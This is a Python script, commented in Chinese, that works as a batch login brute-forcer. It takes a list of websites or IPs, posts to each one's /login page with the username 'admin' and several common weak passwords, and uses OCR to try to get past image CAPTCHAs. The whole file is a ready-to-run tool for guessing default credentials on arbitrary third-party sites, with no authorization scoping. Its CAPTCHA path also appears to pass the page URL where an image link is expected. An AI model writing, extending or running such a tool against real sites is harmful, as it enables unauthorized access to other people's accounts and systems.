import requests
import argparse
import ipaddress
from urllib.parse import urlparse
from PIL import Image
import io
import pytesseract
from bs4 import BeautifulSoup
import json
import sys

name_art = r"""
 ██▓     █    ██     ███▄ ▄███▓ ██▓ ███▄    █   ▄████      █████▒▓█████  ██▓
▓██▒     ██  ▓██▒   ▓██▒▀█▀ ██▒▓██▒ ██ ▀█   █  ██▒ ▀█▒   ▓██   ▒ ▓█   ▀ ▓██▒
▒██░    ▓██  ▒██░   ▓██    ▓██░▒██▒▓██  ▀█ ██▒▒██░▄▄▄░   ▒████ ░ ▒███   ▒██▒
▒██░    ▓▓█  ░██░   ▒██    ▒██ ░██░▓██▒  ▐▌██▒░▓█  ██▓   ░▓█▒  ░ ▒▓█  ▄ ░██░
░██████▒▒▒█████▓    ▒██▒   ░██▒░██░▒██░   ▓██░░▒▓███▀▒   ░▒█░    ░▒████▒░██░
░ ▒░▓  ░░▒▓▒ ▒ ▒    ░ ▒░   ░  ░░▓  ░ ▒░   ▒ ▒  ░▒   ▒     ▒ ░    ░░ ▒░ ░░▓  
░ ░ ▒  ░░░▒░ ░ ░    ░  ░      ░ ▒ ░░ ░░   ░ ▒░  ░   ░     ░       ░ ░  ░ ▒ ░
  ░ ░    ░░░ ░ ░    ░      ░    ▒ ░   ░   ░ ░ ░ ░   ░     ░ ░       ░    ▒ ░
    ░  ░   ░               ░    ░           ░       ░               ░  ░ ░  
                                                                            
"""


def welcome_message():
    print("\n\n\n\n")
    print("-----------欢迎使用批量登录网站脚本！-----------")
    print(name_art)
    print("\n")
    print("使用 -u 参数登录单个网站")
    print("使用 -f 参数登录文件中的网站")
    print("\n")


# 验证是否是正确的url格式
def is_valid_ip(ip_str):
    try:
        ipaddress.ip_address(ip_str)
        return True
    except ValueError:
        return False


def is_valid_url(url):
    try:
        parsed = urlparse(url)
        return bool(parsed.scheme) and bool(parsed.netloc)
    except ValueError:
        return False


def read_urls_from_file(file_path):
    with open(file_path, "r") as file:
        urls = [
            (f"http://{line.strip()}" if is_valid_ip(line.strip()) else line.strip())
            for line in file.readlines()
            if is_valid_url(line.strip())
        ]
    return urls


# 识别验证码模块
def get_captcha(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    captcha_img = soup.find_all('img', {'class': 'captcha-image'})
    if not captcha_img:  # 检查列表是否为空
        print("无法找到验证码图片。")
        return None
    image_link = captcha_img[0]['src']
    return image_link


def recognize_captcha(image_link):
    image_response = requests.get(image_link)
    if 'image' not in image_response.headers['Content-Type']:
        print("获取到的不是图像文件。")
        return None
    image = Image.open(io.BytesIO(image_response.content))
    # 使用pytesseract进行在线识别
    captcha_text = pytesseract.image_to_string(image)
    return captcha_text.strip()


def is_have_captcha(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    # 查找与验证码相关的图片标签
    captcha_img = soup.find_all('img', {'class': 'captcha-image'})
    # 查找与验证码相关的输入标签
    captcha_input = soup.find_all('input', {'name': 'captcha'})
    return len(captcha_img) > 0 or len(captcha_input) > 0


def is_login_successful(response, data):
    if response.status_code == 200:
        response_data = json.loads(response.text)
        if response_data.get('code') == 200:
            print(f"成功登录, 使用密码 {data['password']}")
            return True
        else:
            print(f"登录失败, 使用密码 {data['password']}，失败原因：{response_data.get('msg')}")
            return False
    else:
        print(f"登录失败, 使用密码 {data['password']}，状态码：{response.status_code}")
        return False


def no_captcha(login_url, username, password_list):
    for password in password_list:
        data = {
            "username": username,
            "password": password
        }
        # 发送POST请求进行登录
        response = requests.post(login_url, data=data)
        # 判断是否登录成功
        if is_login_successful(response, data):
            break
        else:
            continue


def have_captcha(login_url, username, password_list):
    for password in password_list:
        captcha1 = recognize_captcha(login_url)
        if captcha1 is None:
            print("获取验证码失败！停止登录！")
            return
        else:
            data = {
                "username": username,
                "password": password,
                "captcha": captcha1
            }
            # 发送POST请求进行登录
            response = requests.post(login_url, data=data)
            # 判断是否登录成功
            if is_login_successful(response, data):
                break
            else:
                continue


def batch_login(websites, username, password_list):
    for url in websites:
        login_url = f"{url}/login"
        if is_have_captcha(login_url):
            print(f"{login_url}检测到验证码")
            have_captcha(login_url, username, password_list)
        else:
            print(f"{login_url}没有验证码，直接登录")
            no_captcha(login_url, username, password_list)


def main():
    if len(sys.argv) == 1:
        welcome_message()
        return

    parser = argparse.ArgumentParser(description="批量登录网站", add_help=False)
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-f", "--file", help="包含网址的文件")
    group.add_argument("-u", "--url", help="单个网址")
    args = parser.parse_args()

    if args.file:
        urls = read_urls_from_file(args.file)
    elif args.url:
        url = args.url
        if is_valid_ip(url):
            url = f"http://{url}"
        if is_valid_url(url):
            urls = [url]
        else:
            print("无效的网址，请检查输入")
            return

    username = "admin"
    password_list = ["666666", "admin", "123456", "admin123"]
    batch_login(urls, username, password_list)


if __name__ == "__main__":
    main()
